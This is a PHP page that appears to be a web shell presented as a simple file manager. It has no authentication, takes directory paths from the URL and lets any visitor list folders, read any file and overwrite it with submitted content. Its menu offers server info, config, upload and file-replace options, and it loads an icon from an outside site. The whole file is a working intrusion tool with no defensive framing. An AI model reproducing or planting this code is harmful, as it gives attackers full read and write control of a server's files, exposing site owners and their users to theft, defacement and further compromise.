<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=MuseoModerno&display=swap');
	body {
		font-family: 'MuseoModerno', cursive;
		overflow: hidden;
	}
	a {
		text-decoration: none;
		color: #000;
	}
	div.container {
		margin:15px;
		width:80%;
		text-align:left;
	}
	div.header {
		border-radius:5px 5px 0px 0px;
		width:100%;
		background:#f2f2f2;
		padding-top:15px;
		padding-bottom:15px;
		border-top: 1px solid #e6e6e6;
		border-left: 1px solid #e6e6e6;
		border-right: 1px solid #e6e6e6;
	}
	span.home {
		margin-left: 15px;
	}
	div.center {
		overflow: auto;
		max-height:800px;
		border-radius:0px 0px 5px 0px;
		padding:10px;
		border-top: 1px solid #e6e6e6;
		border-right: 1px solid #e6e6e6;
		border-bottom: 1px solid #e6e6e6;
	}
	div.tool {
		border-radius:0px 0px 0px 5px;
		width:100%;
		padding-top:15px;
		padding-bottom:15px;
		border: 1px solid #e6e6e6;
	}
	div.tool a {
		display: block;
		padding: 7px;
	}
	div.dir, div.file {
		padding:1px;

	}
	div.info {
		display: inline-block;
		width:100px;
		padding:3px;
		float: right;
		text-align: center;
	}
	select {
		background:#f2f2f2;
		border-radius:4px;
		border: 1px solid #e6e6e6;
		outline: none;
		font-family: 'MuseoModerno', cursive;
		width:100%;
	}
	div.edit {
		padding:10px;
	}
	textarea {
		border: 1px solid #e6e6e6;
		outline: none;
		padding:20px;
		width: 100%;
		height:300px;
		border-radius:5px;
	}
	td.action {
		text-align: center;
		font-size:25px;
	}
	input[type=submit] {
		font-family: 'MuseoModerno', cursive;
		width:100%;
		border-radius:5px;
		background:#f2f2f2;
		border: 1px solid #e6e6e6;
		padding:7px;
	}
	.icons {
		margin-top:5px;
        width:24px;
        height:24px;
    }
	.filename, .textarea, .submit {
		padding:3px;
	}
	::-webkit-scrollbar {
  		width: 0px;
	}
	::-webkit-scrollbar-track {
  		background: none;
	}
	::-webkit-scrollbar-thumb {
  		background:none;
	}
	::-webkit-scrollbar-thumb:hover {
  		background: none; 
	}
	td.img {
		width:30px;
	}
	td.act {
		width:10%;
	}
	textarea::placeholder {
		color: red;
		opacity: 1;
	}
	textarea:-ms-input-placeholder {
  		color: red;
	}
	textarea::-ms-input-placeholder {
  		color: red;
	}
	@media (min-width: 320px) and (max-width: 480px) {
		div.container {
			margin: 0;
			width:121%;
		}
		div.tool, .size, .perms {
			display: none;
		}
		td.act {
			width:13%;

		}
		select {
  			-moz-appearance: none;
  			-webkit-appearance: none;
  			padding: 2px 2px;
		}
		div.center {
			height:420px;
		}
	}
</style>
<center>
<div class="container">
	<div class="row">
		<div class="header">
			<span class="home">
				<a href="?">HOME</a>
			</span>
		</div>
	</div>
	<?php
	class x {
		public static $cwd;
		public static $handle;
		public static $extension;
		public static function cwd() {
			return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
		}
		public static function cd($directory) {
			return chdir($directory);
		}
		public static function files($type) {
			$result = array();
			foreach (scandir(self::cwd()) as $key => $value) {
				$file['name'] = self::cwd() . DIRECTORY_SEPARATOR . $value;
				switch ($type) {
					case 'dir':
						if (!is_dir($file['name']) || $value === '.') continue 2;
						break;
					case 'file':
						if (!is_file($file['name'])) continue 2;
						break;
				}
				$file['size'] 	= (is_dir($file['name'])) ? @filetype($file['name']) : x::size($file['name']);
				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
				$result[] = $file;
			} return $result;
		}
		public static function save($filename = null, $data, $type) {
			switch ($type) {
				case 'save':
					self::$handle = fopen($filename, "w");
					fwrite(self::$handle, $data);
					fclose(self::$handle);
					break;
				case 'makefile':
					self::$handle = fopen($filename, "w");
					fwrite(self::$handle, $data);
					fclose(self::$handle);
					break;
			}
		}
		public static function perms($filename) {
			return substr(sprintf("%o", fileperms($filename)), -4);
		}
		public static function w__($filename, $perms) {
        	if (is_writable($filename)) {
            	return "<font color='green'>{$perms}</font>";
        	} else {
            	return "<font color='red'>{$perms}</font>";
        	}
    	}
    	public static function getimg($filename) {
        	self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        	switch (self::$extension) {
            	case 'php':
                	print("https://image.flaticon.com/icons/png/128/337/337947.png");
                	break;
            	default:
                	print("https://image.flaticon.com/icons/svg/833/833524.svg");
                	break;
        	}
    	}
    	public static function ftime($filename) {
        	return date("F d Y g:i:s", filemtime($filename));
    	}
    	public static function sortname($filename) {
    		return substr(htmlspecialchars($filename), 0, 28).'...';
    	}
    	public static function size($filename) {
        	if (is_file($filename)) {
            	$filepath = $filename;
            	if (!realpath($filepath)) {
                	$filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            	}
            	$filesize = filesize($filepath);
            	$array = array("TB","GB","MB","KB","B");
            	$total = count($array);
            	while ($total-- && $filesize > 1024) {
                	$filesize /= 1024;
            	} return round($filesize, 2) . " " . $array[$total];
        	} return false;
    	}
	}
	?>
	<div class="row">
		<div class="col-xs-2 tool">
			<a href="#">Server Info</a>
			<a href="#">Config</a>
			<a href="#">Upload</a>
			<a href="#">Create FIle</a>
			<a href="#">Replace File</a>
		</div>
		<div class="col-xs-10 center">
			<?php
			switch (@$_POST['action']) {
				case 'edit':
					if (isset($_POST['edit'])) {
						if (x::save($_POST['file'], $_POST['data'], 'save')) {
							print("failed");
						} else {
							print("success");
						}
					}
					?>
					<form method="post">
						<div class="edit">
							<table width='100%'>
								<tr>
									<td>
										<a href="?cd=<?= $_GET['cd'] ?>">
											<img class="icons" src="https://mlisi.xyz/img/shademe.png">
										</a>
									</td>
									<td class="action" colspan="2">EDIT</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Filename
									</td>
									<td>:</td>
									<td>
										<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
									</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Size
									</td>
									<td>:</td>
									<td>
										<?= filesize($_POST['file']) ?>
									</td>
								</tr>
								<tr>
									<td style="width:120px;">
										Last Modif
									</td>
									<td>:</td>
									<td>
										<?= x::ftime($_POST['file']) ?>
									</td>
								</tr>
								<tr>
									<td colspan="3">
										<textarea name="data" placeholder="not writable"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
									</td>
								</tr>
								<tr>
									<td colspan="3">
										<input type="submit" name="edit" value="SAVE">
										<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
										<input type="hidden" name="action" value="edit">
									</td>
								</tr>
							</table>
						</div>
					</form>
					<?php
					exit();
					break;
				}
				if (isset($_GET['cd'])) {
					x::cd($_GET['cd']);
				}
				?> <table width="100%"> <?php
				foreach (x::files('dir') as $key => $dir) { ?>
					<form method="post" action="?cd=<?= x::cwd() ?>">
						<tr>
							<td class="img">
								<img class="icons" src="https://image.flaticon.com/icons/svg/716/716784.svg">
							</td>
							<td>
								<a href="?cd=<?= $dir['name'] ?>"><?= basename($dir['name']) ?></a>
							</td>
							<td class="size">
								<?= $dir['size'] ?>
							</td>
							<td class="perms">
								<?= $dir['perms'] ?>
							</td>
							<td class="act">
								<select name="action" onchange="if(this.value != '0') this.form.submit()">
									<option selected disabled>action</option>
								</select>
								<input type="hidden" name="file" value="<?= $dir['name'] ?>">
							</td>
						</tr>
					</form>
				<?php }
				foreach (x::files('file') as $key => $file) { ?>
					<form method="post" action="?cd=<?= x::cwd() ?>">
						<tr>
							<td>
								<img class="icons" src="<?= x::getimg($file['name']) ?>">
							</td>
							<td>
								<?= x::sortname(basename($file['name'])) ?>
							</td>
							<td class="size">
								<?= $file['size'] ?>
							</td>
							<td class="perms">
								<?= $file['perms'] ?>
							</td>
							<td>
								<select name="action" onchange="if(this.value != '0') this.form.submit()">
									<option selected disabled>action</option>
									<option value="edit">edit</option>
							</select>
							<input type="hidden" name="file" value="<?= $file['name'] ?>">
							</td>
						</tr>
					</form>
				<?php }
				?>
			</table>
		</div>
	</div>
</div>
</center>
